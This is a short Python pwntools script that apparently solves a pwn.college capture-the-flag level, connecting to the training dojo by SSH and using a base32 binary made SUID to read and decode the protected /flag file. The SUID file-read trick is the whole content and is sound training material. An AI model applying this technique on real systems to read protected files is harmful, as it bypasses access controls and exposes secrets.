from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level14 to make /usr/bin/base32 SUID
s.process("/challenge/babysuid_level14")

# Start a bash shell
sh = s.shell()

# Send the command to run /usr/bin/base32 /flag
# ? The first base32 command encodes the flag
# ? Pipe to base32 with "-d" to decode the flag
sh.sendline(b"base32 /flag | base32 -d")
sh.recvuntil(b"pwn.college")

# Receive the output
log.success(f"FLAG: pwn.college{sh.recvline().decode().strip()}")

# Close the SSH connection
s.close()
